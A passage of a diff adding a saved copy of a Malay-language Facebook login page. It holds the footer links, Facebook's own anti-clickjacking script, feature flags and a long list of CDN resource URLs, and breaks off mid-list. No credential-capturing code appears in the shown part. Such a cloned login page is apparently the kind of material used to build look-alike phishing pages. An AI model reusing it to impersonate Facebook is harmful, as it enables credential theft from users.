+                        <li><a role="button" class="_42ft _4jy0 _517i _517h _51sy" rel="dialog" ajaxify="/settings/language/language/?uri=https%3A%2F%2Fde-de.facebook.com%2Flogin%2Fdevice-based%2Fregular%2Flogin&amp;source=www_list_selector_more" href="#" title="Paparkan lebih banyak bahasa"><i class="img sp_hXCnIMXcdxl sx_9f1ddd"></i></a></li>
+                    </ul>
+                    <div id="contentCurve"></div>
+                    <div id="pageFooterChildren" role="contentinfo" aria-label="Pautan laman Facebook">
+                        <ul class="uiList pageFooterLinkList _509- _4ki _703 _6-i">
+                            <li><a href="/r.php" title="Daftar ke Facebook">Daftar</a></li>
+                            <li><a href="/login/" title="Log masuk ke dalam Facebook">Log Masuk</a></li>
+                            <li><a href="https://messenger.com/" title="Semak Messenger.">Messenger</a></li>
+                            <li><a href="/lite/" title="Facebook Lite untuk Android">Facebook Lite</a></li>
+                            <li><a href="https://www.facebook.com/watch/" title="Browse our Watch videos."> Watch </a></li>
+                            <li><a href="/directory/people/" title="Layari direktori pengguna kami.">Orang ramai</a></li>
+                            <li><a href="/directory/pages/" title="Layari direktori halaman kami.">Halaman</a></li>
+                            <li><a href="/pages/category/">Page Categories</a></li>
+                            <li><a href="/places/" title="Lihat tempat yang popular dalam Facebook">Tempat</a></li>
+                            <li><a href="/games/" title="Semak permainan Facebook">Permainan</a></li>
+                            <li><a href="/directory/places/" title="Layar direktori tempat kami.">Lokasi</a></li>
+                            <li><a href="/marketplace/" title="Beli dan Jual di Marketplace Facebook">Ruang Niaga</a></li>
+                            <li><a href="/directory/groups/" title="Layari direktori Kumpulan kami.">Kumpulan</a></li>
+                            <li><a href="https://l.facebook.com/l.php?u=https%3A%2F%2Finstagram.com%2F&amp;h=AT0MqILc0AZaFp_ZkKssmB0E_SgPwmKVzlaMsbZboPqTGr4SVPVOZvQ1C5N2U7szJDMj876IWs6h7zF1ZqeQ2Pi4ZsFfszGrw1Irpx0IiwIj_neT97rU9bUoTOaiCYl3jiV5E62eAYQi2k9znX54_U_2lbNCYwxFx3sp8A" title="Check out Instagram" target="_blank" rel="noopener nofollow" data-lynx-mode="asynclazy">Instagram</a></li>
+                            <li><a href="/local/lists/245019872666104/" title="Browse our Local Lists directory.">Local</a></li>
+                            <li><a href="/fundraisers/" title="Dermalah untuk niat kebajikan.">Pengumpulan Dana</a></li>
+                            <li><a href="/biz/directory/" title="Layari direktori Perkhidmatan Facebook kami.">Perkhidmatan</a></li>
+                            <li><a href="/facebook" accesskey="8" title="Baca blog kami, ketahui pusat sumber, dan cari peluang pekerjaan.">Perihal</a></li>
+                            <li><a href="/ad_campaign/landing.php?placement=pflo&amp;campaign_id=402047449186&amp;extra_1=auto" title="Iklankan di Facebook">Cipta Iklan</a></li>
+                            <li><a href="/pages/create/?ref_type=site_footer" title="Cipta Halaman">Cipta Halaman</a></li>
+                            <li><a href="https://developers.facebook.com/?ref=pf" title="Bangunkan pada platform kami.">Pembangun</a></li>
+                            <li><a href="/careers/?ref=pf" title="Membuat kerjaya anda seterusnya berpindah ke syarikat hebat.">Kerjaya</a></li>
+                            <li><a data-nocookies="1" href="/privacy/explanation" title="Ketahui tentang Facebook dan privasi">Privasi</a></li>
+                            <li><a href="/policies/cookies/" title="Pelajari tentang kuki dan Facebook." data-nocookies="1">Kuki</a></li>
+                            <li><a class="_41ug" data-nocookies="1" href="https://www.facebook.com/help/568137493302217" title="Pelajari tentang Pilihan Iklan.">Pilihan Iklan<i class="img sp_RNXRBsVDn05 sx_56b0e5"></i></a></li>
+                            <li><a data-nocookies="1" href="/policies?ref=pf" accesskey="9" title="Semak terma dan dasar kami">Terma</a></li>
+                            <li><a href="/help/?ref=pf" accesskey="0" title="Lawati Pusat Bantuan kami.">Bantuan</a></li>
+                            <li><a accesskey="6" class="accessible_elem" href="/settings" title="Lihat dan sunting tetapan Facebook anda.">Tetapan</a></li>
+                            <li><a accesskey="7" class="accessible_elem" href="/allactivity?privacy_source=activity_log_top_menu" title="Lihat log aktiviti anda">Log Aktiviti</a></li>
+                        </ul>
+                    </div>
+                    <div class="mvl copyright">
+                        <div><span> Facebook © 2020</span></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div></div><span><img src="https://facebook.com/security/hsts-pixel.gif" width="0" height="0" style="display:none" /></span></div>
+    <div style="display:none"></div>
+    <script type="text/javascript">
+        /*<![CDATA[*/
+        (function() {
+            function si_cj(m) {
+                setTimeout(function() {
+                    new Image().src = "https:\/\/error.facebook.com\/common\/scribe_endpoint.php?c=si_clickjacking&t=7914" + "&m=" + m;
+                }, 5000);
+            }
+            if (top != self) {
+                try {
+                    if (parent != top) {
+                        throw 1;
+                    }
+                    var si_cj_d = ["apps.facebook.com", "apps.beta.facebook.com"];
+                    var href = top.location.href.toLowerCase();
+                    for (var i = 0; i < si_cj_d.length; i++) {
+                        if (href.indexOf(si_cj_d[i]) >= 0) {
+                            throw 1;
+                        }
+                    }
+                    si_cj("3 ");
+                } catch (e) {
+                    si_cj("1 \t");
+                    window.document.write("\u003Cstyle>body * {display:none !important;}\u003C\/style>\u003Ca href=\"#\" onclick=\"top.location.href=window.location.href\" style=\"display:block !important;padding:10px\">Pergi ke Facebook.com\u003C\/a>"); /*k389hyRJ*/
+                }
+            }
+        }()) /*]]>*/
+    </script>
+    <script>
+        requireLazy(["gkx"], function(gkx) {
+            gkx.add({
+                "677762": {
+                    "result": true,
+                    "hash": "AT6qGskCvEOj7gsZ"
+                },
+                "1243461": {
+                    "result": true,
+                    "hash": "AT7hxhwH8J-PJ99U"
+                },
+                "729629": {
+                    "result": false,
+                    "hash": "AT7hIMOpb5MJ3Akr"
+                },
+                "729630": {
+                    "result": false,
+                    "hash": "AT7a1nn4sA-CFe94"
+                },
+                "729631": {
+                    "result": false,
+                    "hash": "AT6PNZCa0nQof5Dz"
+                },
+                "1130462": {
+                    "result": true,
+                    "hash": "AT564bHdaPoctOx_"
+                },
+                "1220350": {
+                    "result": true,
+                    "hash": "AT7RJ5qfjL8HVXne"
+                },
+                "819236": {
+                    "result": false,
+                    "hash": "AT6_GQkyq9AiEdqA"
+                },
+                "1029033": {
+                    "result": false,
+                    "hash": "AT7t5IvXe9rZ0xNF"
+                },
+                "1099893": {
+                    "result": false,
+                    "hash": "AT458ymBShFjbpgr"
+                },
+                "925108": {
+                    "result": false,
+                    "hash": "AT4nB0gY9Mh_hh97"
+                }
+            });
+        });
+        requireLazy(["Bootloader"], function(Bootloader) {
+            Bootloader.setResourceMap({
+                "istiD": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iGr24\/yN\/l\/ms_MY\/WmC_HTzCVX8.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "n52E9": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iTda4\/ya\/l\/ms_MY\/fXdDDLkqBEc.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "rr8Vg": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iCVO4\/y-\/l\/ms_MY\/CNX3eAEtKiC.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "qHw1o": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yg\/r\/WXWcy6ElLP2.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "HdLm2": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yd\/r\/VOHljVDf3ef.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "Ikj44": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i6gl4\/yG\/l\/ms_MY\/DeGxLN8XcLg.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "pJBuZ": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yt\/r\/9e_nEisV5W7.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "OiLyZ": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yW\/r\/R6b5q2rfC40.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "qusv+": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yn\/r\/8YMDXzS4m7C.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "UWlUh": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i5Qr4\/yV\/l\/ms_MY\/2IFmda3syaB.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "2\/maQ": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y6\/r\/O1evg4NvCzK.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "VpjKC": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3ikr84\/yc\/l\/ms_MY\/4M9M5PY_8oA.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "hKKeY": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yd\/r\/mHWhXzVb1py.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "\/mnVq": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iwSL4\/y-\/l\/ms_MY\/0oFMraF1OH3.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "sEH9e": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y2\/r\/9rrE4CR1hO5.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "F2sDX": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3ib1x4\/yO\/l\/ms_MY\/8Pp-syrnzx5.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "2Wj4c": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yc\/r\/T3jt5CLGIfU.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "uKYzh": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3ihQw4\/y6\/l\/ms_MY\/mDcIfS_UR5o.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "G7W4q": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yl\/r\/IsJ-LcpxXBA.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "rQxKI": {
+                    "type": "css",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y8\/l\/0,cross\/O7DBEMDYKBR.css?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "SZF6m": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iB8v4\/yW\/l\/ms_MY\/fSsg3NTJ678.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "YJVM9": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iRU34\/y0\/l\/ms_MY\/lY-TdMZvtzI.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "zva6n": {
+                    "type": "css",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yO\/l\/0,cross\/GG5TKR_jl62.css?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "GPRqR": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i-Xk4\/yF\/l\/ms_MY\/sU3Xk-xCwgV.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "SKyM5": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i62R4\/ym\/l\/ms_MY\/Oq3251W93gA.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "9vIN5": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yv\/r\/uGA3b2GsHZQ.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "68RAo": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iWDX4\/yK\/l\/ms_MY\/TsMoAQXto5w.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "Zuwkj": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3ik794\/yW\/l\/ms_MY\/eS1FXJUpkXA.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "Ql5yg": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/ym\/r\/-4ETxBQ4ANH.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "PBgYe": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iATP4\/yw\/l\/ms_MY\/S6lH3MKSWKm.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "IXyT4": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iKUC4\/yN\/l\/ms_MY\/ySuF8LsrRrZ.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "Le3KK": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iJ0V4\/yS\/l\/ms_MY\/1FC9SjcE4iW.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "BgDxx": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iIj74\/y1\/l\/ms_MY\/fNNFdlW7Jih.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "o\/H6N": {
+                    "type": "css",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yl\/l\/0,cross\/NuLg0Wy3Nbw.css?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "gXVUs": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iBHA4\/yb\/l\/ms_MY\/Hs26nJ_5XGE.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "nCyK4": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iB3E4\/yk\/l\/ms_MY\/1ydQi5ZLH0I.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "Vw6Lb": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3irzs4\/yb\/l\/ms_MY\/XIuVsIsyFR_.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "AP7eF": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iyUy4\/yy\/l\/ms_MY\/bJm0KsZ0KHz.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "4BbhL": {
+                    "type": "css",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yF\/l\/0,cross\/snUoN9bp_j3.css?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "np5Vl": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y4\/r\/cAwlKIH9oOW.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "smtkO": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i0aO4\/y3\/l\/ms_MY\/Vn8ir14k1mt.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "SV0z9": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3irEA4\/yv\/l\/ms_MY\/EIMy1puvw1S.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "eA2xC": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yj\/r\/xKUi6EZyPAr.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "iZaiH": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yt\/r\/9ftMRFjfK4P.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "ThdFi": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yo\/r\/h9K1gCMqlJo.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "Arpjm": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iZqa4\/ym\/l\/ms_MY\/fxswd_xh1g2.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "9lOZS": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yz\/r\/3X5N5HdmhB3.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "zJMYB": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iYPr4\/yj\/l\/ms_MY\/EdtcrT-tUnI.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "tBF0I": {
+                    "type": "css",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yq\/l\/0,cross\/NMqVLW2K5N6.css?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "VFR1q": {
+                    "type": "css",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yJ\/l\/0,cross\/mQLRqEjrjW_.css?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "m6q0h": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iyC04\/ys\/l\/ms_MY\/xB0DjY4ffJ4.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "2tKOj": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3ivsD4\/yw\/l\/ms_MY\/rutQgyPxtfW.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "PccN6": {
+                    "type": "css",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yt\/l\/0,cross\/I-Upw94TGQp.css?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "oEsh0": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y0\/r\/BR3UQUFX2en.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "7NHNJ": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3idq94\/yE\/l\/ms_MY\/yYLvwfpLQbB.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "P2Tap": {
+                    "type": "css",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yu\/l\/0,cross\/xRuBxCsHPqT.css?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "3oFMI": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yH\/r\/AYHlxFLJnvw.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "i7D7c": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i5eC4\/yK\/l\/ms_MY\/2unPFy2wnbV.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "taiwp": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iKkJ4\/yB\/l\/ms_MY\/XigE6SFTqXJ.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "V6ah8": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yc\/r\/raGNMFTjJxn.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "WnvF8": {
+                    "type": "css",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yG\/l\/0,cross\/a9xyXnU370K.css?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "S59rN": {
+                    "type": "css",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yU\/l\/0,cross\/n9AvDso5VT3.css?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "pWU5e": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i2oZ4\/yo\/l\/ms_MY\/CJ2Ihs1iC8z.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "97eN7": {
+                    "type": "css",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yG\/l\/0,cross\/0896qmZfF7z.css?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "Hn1NR": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3isQ44\/y3\/l\/ms_MY\/r-jzgE_kgyL.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "Uwlfp": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3ibJp4\/yC\/l\/ms_MY\/QwrxEjGl_lw.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "lFcmZ": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iERU4\/yv\/l\/ms_MY\/2T8OkemGs-V.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "gcDYl": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yV\/r\/KVM3qKQ7kj4.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "Ah2zJ": {
+                    "type": "css",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yp\/l\/0,cross\/acY_F-auiGm.css?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "liORJ": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yi\/r\/AnOu4prKY5b.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "dLfzO": {
+                    "type": "css",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yQ\/l\/0,cross\/x6xVixxQeei.css?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "rUhva": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3ivsb4\/yh\/l\/ms_MY\/Cqfmvd0liN2.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "4p\/OI": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iPOC4\/yY\/l\/ms_MY\/jQ8U7LBeDwm.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "CLmH0": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yI\/r\/n1J0xHM-7Yl.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "hHKKq": {
+                    "type": "css",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y3\/l\/0,cross\/pUv_p_qT-i7.css?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "jzmT8": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3ikr84\/yN\/l\/ms_MY\/2p2ur3K3H6n.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "QJ2yO": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iIsg4\/yh\/l\/ms_MY\/cRoeVrm7Jwq.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "EE0aD": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iKIp4\/yW\/l\/ms_MY\/dzbAxBS4S6j.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "nxkK8": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3in_34\/y1\/l\/ms_MY\/wgSVKlWLBmO.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "7Lqro": {
+                    "type": "css",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yV\/l\/0,cross\/XPiUrrTJ0yu.css?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "jqcVb": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yt\/r\/nWQnHqNgFtv.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "d4WqK": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yo\/r\/Vj4lIuaE-W7.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "TUDA+": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3ikr84\/yb\/l\/ms_MY\/BXBTi6LygSt.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "1eQSp": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yR\/r\/FP11Fxze7AD.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "SYsOH": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y6\/r\/vPL18zApRnh.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "b0NcP": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yx\/r\/LXJxlL94u16.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "ZCxc9": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iM5p4\/yj\/l\/ms_MY\/VNeL8NjjXeR.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "p1PhX": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i6nj4\/yO\/l\/ms_MY\/f0ee_X8-szA.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "OHCTj": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i71d4\/yq\/l\/ms_MY\/gAKl7qwuI7r.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "iT+PG": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3i3Sj4\/y3\/l\/ms_MY\/W2l30wSOHia.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "7S171": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yy\/r\/HYblp2R0w3r.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "gWMJg": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yH\/r\/iGksp69foR_.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "ZU1ro": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yU\/r\/QKWIqWeZBgJ.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "VwejP": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yG\/r\/AWkOd0DXTvu.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "VMKqM": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yr\/r\/c-C32MOXUtw.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "8nyZ9": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3isoB4\/yO\/l\/ms_MY\/GgGUa6PRuac.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "Andmd": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iVur4\/yQ\/l\/ms_MY\/33P0Ger2G9e.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "8ELCB": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/ye\/r\/4c56_sYLseJ.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "+ClWy": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y_\/r\/HBJ1fqH-E0d.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "0lLrn": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/yw\/r\/vgooVJBbaAh.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "oE4Do": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y2\/r\/eAdKAwutbmm.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "LmXGv": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y3\/r\/Kp3_Htw0yeX.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "SJElA": {
+                    "type": "js",
+                    "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y0\/r\/O4cKeSQH7QX.js?_nc_x=Ij3Wp8lg5Kz"
+                },
+                "P\/mr5": {
+                    "type": "css",
